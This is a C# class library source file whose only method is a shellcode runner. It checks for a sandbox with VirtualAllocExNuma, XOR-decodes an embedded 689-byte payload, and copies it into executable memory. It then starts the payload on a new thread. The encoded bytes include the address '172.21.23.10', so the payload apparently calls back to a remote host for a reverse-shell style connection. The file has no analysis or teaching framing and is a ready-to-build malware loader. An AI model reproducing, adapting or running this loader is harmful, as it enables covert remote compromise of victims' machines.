using System;
using System.Runtime.InteropServices;

namespace ClassLibrary1
{
    public class Class1
    {


        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        public static void runner()
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            byte[] buf = new byte[689] {0x56,0xe2,0x29,0x4e,0x5a,0x42,0x66,0xaa,0xaa,0xaa,0xeb,0xfb,0xeb,0xfa,0xf8,0xfb,0xfc,0xe2,0x9b,0x78,0xcf,0xe2,0x21,0xf8,0xca,0xe2,0x21,0xf8,0xb2,0xe2,0x21,0xf8,0x8a,0xe2,0x21,0xd8,0xfa,0xe2,0xa5,0x1d,0xe0,0xe0,0xe7,0x9b,0x63,0xe2,0x9b,0x6a,0x06,0x96,0xcb,0xd6,0xa8,0x86,0x8a,0xeb,0x6b,0x63,0xa7,0xeb,0xab,0x6b,0x48,0x47,0xf8,0xe2,0x21,0xf8,0x8a,0x21,0xe8,0x96,0xe2,0xab,0x7a,0xeb,0xfb,0xcc,0x2b,0xd2,0xb2,0xa1,0xa8,0xa5,0x2f,0xd8,0xaa,0xaa,0xaa,0x21,0x2a,0x22,0xaa,0xaa,0xaa,0xe2,0x2f,0x6a,0xde,0xcd,0xe2,0xab,0x7a,0xee,0x21,0xea,0x8a,0xe3,0xab,0x7a,0xfa,0x21,0xe2,0xb2,0x49,0xfc,0xe7,0x9b,0x63,0xe2,0x55,0x63,0xeb,0x21,0x9e,0x22,0xe2,0xab,0x7c,0xe2,0x9b,0x6a,0xeb,0x6b,0x63,0xa7,0x06,0xeb,0xab,0x6b,0x92,0x4a,0xdf,0x5b,0xe6,0xa9,0xe6,0x8e,0xa2,0xef,0x93,0x7b,0xdf,0x72,0xf2,0xee,0x21,0xea,0x8e,0xe3,0xab,0x7a,0xcc,0xeb,0x21,0xa6,0xe2,0xee,0x21,0xea,0xb6,0xe3,0xab,0x7a,0xeb,0x21,0xae,0x22,0xeb,0xf2,0xeb,0xf2,0xf4,0xf3,0xe2,0xab,0x7a,0xf0,0xeb,0xf2,0xeb,0xf3,0xeb,0xf0,0xe2,0x29,0x46,0x8a,0xeb,0xf8,0x55,0x4a,0xf2,0xeb,0xf3,0xf0,0xe2,0x21,0xb8,0x43,0xe1,0x55,0x55,0x55,0xf7,0xe2,0x9b,0x71,0xf9,0xe3,0x14,0xdd,0xc3,0xc4,0xc3,0xc4,0xcf,0xde,0xaa,0xeb,0xfc,0xe2,0x23,0x4b,0xe3,0x6d,0x68,0xe6,0xdd,0x8c,0xad,0x55,0x7f,0xf9,0xf9,0xe2,0x23,0x4b,0xf9,0xf0,0xe7,0x9b,0x6a,0xe7,0x9b,0x63,0xf9,0xf9,0xe3,0x10,0x90,0xfc,0xd3,0x0d,0xaa,0xaa,0xaa,0xaa,0x55,0x7f,0x42,0xa7,0xaa,0xaa,0xaa,0x9b,0x9d,0x98,0x84,0x98,0x9b,0x84,0x98,0x99,0x84,0x9b,0x9a,0xaa,0xf0,0xe2,0x23,0x6b,0xe3,0x6d,0x6a,0x11,0xab,0xaa,0xaa,0xe7,0x9b,0x63,0xf9,0xf9,0xc0,0xa9,0xf9,0xe3,0x10,0xfd,0x23,0x35,0x6c,0xaa,0xaa,0xaa,0xaa,0x55,0x7f,0x42,0x22,0xaa,0xaa,0xaa,0x85,0x9d,0xdc,0xc5,0xd3,0xc5,0x9f,0xda,0x9d,0xc4,0xc5,0xef,0xdc,0xfa,0xe9,0x9e,0x87,0xfe,0xcc,0xf3,0xed,0xe8,0xdd,0xd2,0xe2,0xe2,0xf8,0xf0,0xd3,0xe0,0xce,0xdc,0xc4,0xf5,0xf0,0xce,0xde,0xc7,0xfc,0x9a,0xdb,0xdf,0xc4,0xf2,0xc1,0xf5,0xe9,0xc4,0x87,0x99,0xc5,0xfd,0xdb,0xef,0x9e,0xcf,0xdc,0xc8,0xc6,0xff,0x99,0xda,0xcf,0xd3,0xe4,0xc4,0xed,0xed,0xed,0xf9,0x93,0xfa,0xc9,0xe6,0xff,0xe1,0xdf,0xe0,0xcc,0xfb,0xf2,0xc4,0xfc,0xdb,0xe6,0xdd,0xde,0xcf,0xe9,0xe2,0xf8,0x9c,0x9d,0xfd,0xc3,0x9f,0xc7,0xfb,0xd9,0xc7,0xec,0xf9,0xe3,0x98,0xd0,0xdb,0xcd,0xce,0xda,0xfa,0xcb,0x93,0xf3,0xcb,0xfc,0xdb,0xd3,0xfe,0xe2,0x87,0x92,0xf2,0xe7,0xe4,0xcb,0x92,0xfe,0x9a,0xc0,0x99,0xcc,0xc4,0xc6,0x9f,0xc1,0xaa,0xe2,0x23,0x6b,0xf9,0xf0,0xeb,0xf2,0xe7,0x9b,0x63,0xf9,0xe2,0x12,0xaa,0x98,0x02,0x2e,0xaa,0xaa,0xaa,0xaa,0xfa,0xf9,0xf9,0xe3,0x6d,0x68,0x41,0xff,0x84,0x91,0x55,0x7f,0xe2,0x23,0x6c,0xc0,0xa0,0xf5,0xe2,0x23,0x5b,0xc0,0xb5,0xf0,0xf8,0xc2,0x2a,0x99,0xaa,0xaa,0xe3,0x23,0x4a,0xc0,0xae,0xeb,0xf3,0xe3,0x10,0xdf,0xec,0x34,0x2c,0xaa,0xaa,0xaa,0xaa,0x55,0x7f,0xe7,0x9b,0x6a,0xf9,0xf0,0xe2,0x23,0x5b,0xe7,0x9b,0x63,0xe7,0x9b,0x63,0xf9,0xf9,0xe3,0x6d,0x68,0x87,0xac,0xb2,0xd1,0x55,0x7f,0x2f,0x6a,0xdf,0xb5,0xe2,0x6d,0x6b,0x22,0xb9,0xaa,0xaa,0xe3,0x10,0xee,0x5a,0x9f,0x4a,0xaa,0xaa,0xaa,0xaa,0x55,0x7f,0xe2,0x55,0x65,0xde,0xa8,0x41,0x00,0x42,0xff,0xaa,0xaa,0xaa,0xf9,0xf3,0xc0,0xea,0xf0,0xe3,0x23,0x7b,0x6b,0x48,0xba,0xe3,0x6d,0x6a,0xaa,0xba,0xaa,0xaa,0xe3,0x10,0xf2,0x0e,0xf9,0x4f,0xaa,0xaa,0xaa,0xaa,0x55,0x7f,0xe2,0x39,0xf9,0xf9,0xe2,0x23,0x4d,0xe2,0x23,0x5b,0xe2,0x23,0x70,0xe3,0x6d,0x6a,0xaa,0x8a,0xaa,0xaa,0xe3,0x23,0x53,0xe3,0x10,0xb8,0x3c,0x23,0x48,0xaa,0xaa,0xaa,0xaa,0x55,0x7f,0xe2,0x29,0x6e,0x8a,0x2f,0x6a,0xde,0x18,0xcc,0x21,0xad,0xe2,0xab,0x69,0x2f,0x6a,0xdf,0x78,0xf2,0x69,0xf2,0xc0,0xaa,0xf3,0x11,0x4a,0xb7,0x80,0xa0,0xeb,0x23,0x70,0x55,0x7f};
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] ^ 0xAA) & 0xFF);
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
